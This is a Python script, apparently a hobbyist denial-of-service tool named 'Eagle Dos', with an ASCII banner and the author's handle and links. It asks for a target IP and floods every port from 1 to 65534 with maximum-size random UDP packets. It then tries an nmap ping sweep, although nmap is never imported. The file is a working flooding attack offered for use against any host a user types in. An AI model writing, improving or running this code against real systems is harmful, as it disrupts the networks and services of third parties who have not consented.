import socket
import os
import random
import time

BOLD = '\033[1m'
RED = '\033[31m'
NORMAL = '\033[0m'

def print_header():
    print(" ")
    print("                              $$\                       $ \                     ")
    print("                              $$ |                      $$ |                    ")
    print(" $$$$$$\   $$$$$$\   $$$$$$\  $$ | $$$$$$\         $$$$$$$ | $$$$$$\   $$$$$$$\ ")
    print("$$  __$$\  \____$$\ $$  __$$\ $$ |$$  __$$\       $$  __$$ |$$  __$$\ $$  _____|")
    print("$$$$$$$$ | $$$$$$$ |$$ /  $$ |$$ |$$$$$$$$ |      $$ /  $$ |$$ /  $$ |\$$$$$$\  ")
    print("$$   ____|$$  __$$ |$$ |  $$ |$$ |$$   ____|      $$ |  $$ |$$ |  $$ | \____$$\ ")
    print("\$$$$$$$\ \$$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\       \$$$$$$$ |\$$$$$$  |$$$$$$$  |")
    print(" \_______| \_______| \____$$ |\__| \_______|       \_______| \______/ \_______/ ")
    print("                    $$\   $$ |                                                  ")
    print("                    \$$$$$$  |                                                  ")
    print("                     \______/                                                   ")
    print()

def print_info():
    print(f"[{BOLD}{RED}#]{BOLD}{RED} Author : White Eagle{NORMAL}   Eagle Dos From - {BOLD}{RED}WH1T3{NORMAL}")
    print()
    print("\033[32m================================================================\033[0m")
    print("\033[32mTool developed : white-eagle\033[0m")
    print("\033[33mGithub         : https://github.com/WH1T3-E4GL3/\033[0m")
    print("\033[33mTelegram       : https://t.me/Ka_KsHi_HaTaKe\033[0m")
    print("\033[32m================================================================\033[0m")
    print()

def perform_attack(ip):
    white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65507)
    os.system("clear")
    print("Attack starting...")
    time.sleep(3)
    sent = 0
    for port in range(1, 65535):
        try:
            white.sendto(bytes, (ip, port))
            sent += 1
            print(f"\033[1;91mSend \033[1;32m{sent} \033[1;91mPackets to \033[1;32m{ip} \033[1;91mThrough port \033[1;32m{port}")
        except socket.error as e:
            print(f"\033[1;91mError sending packet to port {port}: {str(e)}\033[0m")
    print("\033[1;92mAttack finished\033[0m")

def perform_ping(ip):
    nm = nmap.PortScanner()
    try:
        nm.scan(ip, arguments='-sn')
        hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
        for host, status in hosts_list:
            print(f"Host: {host}\tStatus: {status}")
    except nmap.PortScannerError as e:
        print(f"\033[1;91mError scanning host: {str(e)}\033[0m")

def main():
    print_header()
    print_info()
    ip = input("[+] Target's IP : ")
    perform_attack(ip)
    perform_ping(ip)

if __name__ == "__main__":
    main()
